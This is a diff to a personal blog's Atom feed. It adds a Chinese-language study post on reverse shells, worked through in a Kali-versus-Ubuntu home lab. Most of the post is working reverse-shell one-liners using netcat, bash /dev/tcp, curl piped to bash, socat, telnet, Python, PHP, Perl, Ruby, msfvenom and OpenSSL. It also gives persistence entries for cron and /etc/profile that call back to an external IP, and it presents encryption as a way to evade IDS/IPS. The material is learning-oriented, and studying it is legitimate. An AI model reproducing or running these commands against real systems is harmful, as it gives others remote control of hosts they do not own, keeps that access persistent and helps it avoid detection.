@@ -3,7 +3,115 @@
     <id>https://hq185187.github.io</id>
     <title>welcome to my blog</title>
     <link href="https://hq185187.github.io" />
-    <updated>2023-06-21T03:09:09.169Z</updated>
+    <updated>2023-06-21T13:44:24.210Z</updated>
+    <entry>
+        <id>https://hq185187.github.io/2023/06/21/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/</id>
+        <title>反弹shell学习</title>
+        <link rel="alternate" href="https://hq185187.github.io/2023/06/21/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/"/>
+        <content type="html">&lt;h3 id=&#34;什么是反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#什么是反弹shell&#34;&gt;#&lt;/a&gt; 什么是反弹 shell&lt;/h3&gt;
+&lt;p&gt;reverse shell, 就是控制端监听在某 TCP/UDP 端口，被控端请求到该控制端端口，并将祺命令行的输入输出转到控制端&lt;/p&gt;
+&lt;h3 id=&#34;什么时候用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#什么时候用&#34;&gt;#&lt;/a&gt; 什么时候用？&lt;/h3&gt;
+&lt;p&gt;通常用于被控端防火墙受限，权限不足，端口被占用等情形&lt;br&gt;
+假设我们攻击了一台机器，打开了该机器的一个端口，我们可以用自己的机器去连接目标机器，这种叫正向连接，远程桌面，web 服务，ssh，telnet 等等&lt;br&gt;
+但是以下情况：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;客户机中了你的马，但是在局域网内&lt;/li&gt;
+&lt;li&gt;它的 ip 会动态改变，不能持续控制&lt;/li&gt;
+&lt;li&gt;防火墙限制，对方只能发送请求，不能接收请求&lt;br&gt;
+此时只能反弹 shell，就是攻击者指定服务器，受害者主机主动连接攻击者的服务端程序&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;环境：&lt;br&gt;
+192.168.81.122（kali 攻击机）&lt;br&gt;
+192.168.81.113  ubuntu)&lt;/p&gt;
+&lt;h3 id=&#34;netcat反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#netcat反弹shell&#34;&gt;#&lt;/a&gt; netcat 反弹 shell&lt;/h3&gt;
+&lt;p&gt;Linux 默认带 netcat 但是为了安全考虑把反弹 shell 的 - e 给删了&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar -xvzf netcat-0.7.1.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./configure&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make &amp;amp;&amp;amp; make install&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make clean&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;攻击机开启监听：&lt;br&gt;
+netcat -lvnp 23333&lt;br&gt;
+ 目标机主动连接：&lt;br&gt;
+netcat  192.168.81.122 23333 -e /bin/bash&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2023/06/21/xYqT8Eb9t1OXUkZ.png&#34; alt=&#34;屏幕截图 2023-06-21 183357.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;利用bash反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用bash反弹shell&#34;&gt;#&lt;/a&gt; 利用 bash 反弹 shell&lt;/h3&gt;
+&lt;p&gt;常用:&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;解析:&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bash -i 产生一个bash交互环境&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt;&amp;amp;    将联合符号前面的内容与后面相结合，然后一起重定向给后者。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/dev/tcp/ip/port  让目标主机与攻击机ip的port端口建立一个tcp连接&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0&amp;gt;&amp;amp;1  将标准输入与输出的内容相结合,然后重定向到前面标准输出的内容&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;实操:&lt;br&gt;
+kali:&lt;br&gt;
+nc -lvnp 23333&lt;br&gt;
+ubuntu:&lt;br&gt;
+bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.81.122/23333 0&amp;gt;&amp;amp;1&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/06/21/Pog29TSt4VZ5zbM.png&#34; alt=&#34;屏幕截图 2023-06-21 185633.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;curl配合bash反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#curl配合bash反弹shell&#34;&gt;#&lt;/a&gt; Curl 配合 Bash 反弹 shell&lt;/h3&gt;
+&lt;p&gt;在 kali 的 www 目录下创建一个 index.php 或者 index.html&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.81.122/2333 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;Ubuntu:&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;curl 192.168.81.122|bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;反弹shell写进定时任务&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反弹shell写进定时任务&#34;&gt;#&lt;/a&gt; 反弹 shell 写进定时任务&lt;/h3&gt;
+&lt;p&gt;假设当前用户名为 root,centos 主机写进 /var/spool/cron/root,Ubuntu/Debian 主机写进 /var/spool/cron/crontabs/root 中&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;*/1  *  *  *  *   /bin/bash -i&amp;gt;&amp;amp;/dev/tcp/47.xxx.xxx.72/2333 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;反弹 shell 命令写进 /etc/profile 文件&lt;br&gt;
+ /etc/profile 文件的内容会在用户打开 bash 窗口的时候执行&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/47.xxx.xxx.72/2333 0&amp;gt;&amp;amp;1 &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 最后面那个&amp;amp;为的是防止管理员无法输入命令&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;当目标主机管理员远程连接该主机时，就会成功执行 shell 命令&lt;/p&gt;
+&lt;h3 id=&#34;利用socat反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用socat反弹shell&#34;&gt;#&lt;/a&gt; 利用 Socat 反弹 shell&lt;/h3&gt;
+&lt;p&gt;Socat 功能与 netcat 类似，据说是 netcat 的加强版&lt;br&gt;
+使用:&lt;br&gt;
+kali&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;socat TCP-LISTEN:2333 -&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;或者&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -lvnp 2333&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;ubuntu&lt;br&gt;
+ 安装:apt install socat&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;socat tcp-connect:192.168.81.122:2333 exec:&amp;#x27;bash -li&amp;#x27;,pty,stderr,setsid,sigint,sane&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;结果:&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2023/06/21/NscbIgO2WjiSGMU.png&#34; alt=&#34;屏幕截图 2023-06-21 202214.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/06/21/y2zbgodxYUOIHfC.png&#34; alt=&#34;屏幕截图 2023-06-21 202241.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;利用telnet反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用telnet反弹shell&#34;&gt;#&lt;/a&gt; 利用 Telnet 反弹 shell&lt;/h3&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvnp 2333(kali)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mknod a p; telnet 192.168.81.122 2333 0&amp;lt;a | /bin/bash 1&amp;gt;a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/06/21/qXZ5NnMIYGamDUA.png&#34; alt=&#34;屏幕截图 2023-06-21 202723.png&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2023/06/21/n1tvjUQyO2lBwz9.png&#34; alt=&#34;屏幕截图 2023-06-21 202732.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;各种脚本执行反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#各种脚本执行反弹shell&#34;&gt;#&lt;/a&gt; 各种脚本执行反弹 shell&lt;/h3&gt;
+&lt;h4 id=&#34;python脚本反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#python脚本反弹shell&#34;&gt;#&lt;/a&gt; python 脚本反弹 shell&lt;/h4&gt;
+&lt;p&gt;当目标主机上有 python 环境时，可以用 python 来反弹 shell&lt;br&gt;
+ 攻击机:   nc -lvnp 2333&lt;br&gt;
+ 目标机主动连接攻击机:&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;192.168.81.122&amp;quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h4 id=&#34;php脚本反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php脚本反弹shell&#34;&gt;#&lt;/a&gt; php 脚本反弹 shell&lt;/h4&gt;
+&lt;p&gt;目标机主动连接:&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;php -r &amp;#x27;$sock=fsockopen(&amp;quot;192.168.81.122&amp;quot;,2333);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h4 id=&#34;perl脚本反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#perl脚本反弹shell&#34;&gt;#&lt;/a&gt; Perl 脚本反弹 shell&lt;/h4&gt;
+&lt;p&gt;目标机:&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;perl -e &amp;#x27;use Socket;$i=&amp;quot;192.168.81.122&amp;quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&amp;#123;open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);&amp;#125;;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h4 id=&#34;ruby脚本反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ruby脚本反弹shell&#34;&gt;#&lt;/a&gt; Ruby 脚本反弹 shell&lt;/h4&gt;
+&lt;p&gt;目标机:&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ruby -rsocket -e &amp;#x27;c=TCPSocket.new(&amp;quot;192.168.81.122&amp;quot;,&amp;quot;2333&amp;quot;);while(cmd=c.gets);IO.popen(cmd,&amp;quot;r&amp;quot;)&amp;#123;|io|c.print io.read&amp;#125;end&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;或&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ruby -rsocket -e &amp;#x27;exit if fork;c=TCPSocket.new(&amp;quot;192.168.81.122&amp;quot;,&amp;quot;2333&amp;quot;);while(cmd=c.gets);IO.popen(cmd,&amp;quot;r&amp;quot;)&amp;#123;|io|c.print io.read&amp;#125;end&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h4 id=&#34;metasploit生产反弹shell的一句话&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#metasploit生产反弹shell的一句话&#34;&gt;#&lt;/a&gt; Metasploit 生产反弹 shell 的一句话&lt;/h4&gt;
+&lt;p&gt;当我们忘记前面的语句时可以用 metasploit 来生成&lt;br&gt;
+ &lt;code&gt;msfvenom -l payloads | grep &#39;cmd/unix/reverse&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;比如我们生产一个 python 的:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;msfvenom -p cmd/unix/reverse_python LHOST=192.168.81.122 LPORT=2333 -f raw&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;反弹shell后获取模拟终端&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反弹shell后获取模拟终端&#34;&gt;#&lt;/a&gt; 反弹 shell 后获取模拟终端&lt;/h3&gt;
+&lt;p&gt;此时获得的 shell 不是一个标准的虚拟终端环境，交互性非常差，vim 和 sudo 这种操作都做不了，此时我们可以借助 python 的 pty 库来获取一个标准的虚拟终端环境.&lt;/p&gt;
+&lt;p&gt;在获取的 shell 里输入:&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;quot;import pty;pty.spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;openssl反弹加密shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#openssl反弹加密shell&#34;&gt;#&lt;/a&gt; OpenSSL 反弹加密 shell&lt;/h3&gt;
+&lt;p&gt;上文的反弹 shell 方法的所有的流量都是&lt;mark&gt;明文传输的&lt;/mark&gt;，这些通过 shell 传输的流量都能被管理员直接抓取和理解，若目标主机有网络防御检测系统 (IDS,IPS 等), 会把我们的通信内容进行告警和阻止，因此我们需要对通信的内容进行安全通信，避免窃听，同时确认另一端连接着的身份&lt;/p&gt;
+&lt;h4 id=&#34;openssl简历&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#openssl简历&#34;&gt;#&lt;/a&gt; OpenSSL 简历&lt;/h4&gt;
+&lt;p&gt;它时一个开发源代码的软件包库，应用程序可以使用这个包来进行安全通信，避免窃听，同时确定另一端连接者的身份&lt;br&gt;
+使用前需要先生产自签名证书:&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h4 id=&#34;使用openssl反弹加密shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用openssl反弹加密shell&#34;&gt;#&lt;/a&gt; 使用 OpenSSL 反弹加密 shell&lt;/h4&gt;
+&lt;p&gt;攻击机:&lt;br&gt;
+ 首先需要利用上一步生成的自签名证书&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;openssl s_server -quiet -key key.pem -cert cert.pem -port 2333&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;此时的 Open SSL 在攻击机的 2333 端口启动了一个 SSL/TLS server&lt;br&gt;
+ 目标机:&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mkfifo /tmp/s; /bin/sh -i &amp;lt; /tmp/s 2&amp;gt;&amp;amp;1 | openssl s_client -quiet -connect 192.168.81.122:2333 &amp;gt; /tmp/s; rm /tmp/s&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;结果:&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2023/06/21/uj6WzPMqKcikZFh.png&#34; alt=&#34;屏幕截图 2023-06-21 214152.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/06/21/kwKvQHPf372FuGy.png&#34; alt=&#34;屏幕截图 2023-06-21 214142.png&#34;&gt;&lt;/p&gt;
+</content>
+        <updated>2023-06-21T13:44:24.210Z</updated>
+    </entry>
     <entry>
         <id>https://hq185187.github.io/2023/06/21/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/</id>
         <title>Mysql主从复制</title>
